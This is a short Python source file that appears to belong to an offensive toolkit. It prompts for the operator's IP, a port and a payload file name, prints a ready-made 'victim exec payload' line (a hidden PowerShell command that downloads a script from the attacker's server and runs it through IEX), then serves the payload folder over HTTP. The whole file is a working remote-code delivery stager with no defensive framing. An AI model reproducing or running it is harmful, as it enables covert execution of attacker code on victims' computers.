import os
class webserver:
    def __init__(self):
        self.path = os.getcwd()
        self.IP = input("What's your public(local) IP >>>")
        self.PORT = input("what's Port do you want to open for server >>>")
        self.filename = input("what's your outputfile name? Ex:payload.ps1 >>>")
        print("victim exec payload : powershell.exe -nop -w hidden -c IEX (New-Object Net.Webclient).DownloadString('http://%s:%s/%s')" %(self.IP,self.PORT,self.filename))
        os.chdir('output')
        os.system('python -m SimpleHTTPServer %s'%self.PORT)
